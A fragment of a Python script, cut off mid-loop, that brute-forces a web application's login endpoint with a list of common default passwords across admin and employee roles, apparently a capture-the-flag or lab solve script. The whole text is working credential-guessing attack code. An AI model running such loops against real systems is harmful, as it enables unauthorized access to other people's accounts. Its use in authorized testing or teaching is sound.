passwords = [
    'admin','admin123','Admin123','password','password1','password123','123456','12345678','qwerty','abc123','letmein','welcome','passw0rd','admin@123',
    'root','toor','manager','employee','user','guest','test','superuser','changeme','default','iloveyou','monkey','dragon'
]

session = requests.Session()

for role in ['admin','employee']:
    for u, p in itertools.product(usernames, passwords):
        try:
            r = session.post(base + '/login', data={'username': u, 'password': p, 'role': role}, timeout=2)
            j = r.json()
            if j.get('success') is True:
